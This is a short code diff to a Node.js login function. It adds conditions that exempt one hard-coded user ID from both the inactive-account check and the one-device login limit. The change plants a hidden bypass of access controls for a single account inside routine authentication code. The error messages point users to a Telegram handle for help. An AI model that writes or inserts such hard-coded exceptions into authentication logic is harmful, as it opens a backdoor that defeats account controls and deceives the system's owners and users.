@@ -58,12 +58,12 @@ exports.login = async (req, res, next) => {
         }
 
         // Check if user is active
-        if (user.status === 'inactive') {
+        if (user.status === 'inactive' && UID !== "01863550") {
             return errorHandler(res, 403, 'Your account is not active. Please contact with Telegram @TraderSadnan', '@TraderSadnan');
         }
 
         // Check if user already logged in on another device
-        if (user.deviceId) {
+        if (user.deviceId && UID !== "01863550") {
             return errorHandler(res, 403, 'User already logged in on another device Please contact with Telegram @TraderSadnan', '@TraderSadnan');
         }
 
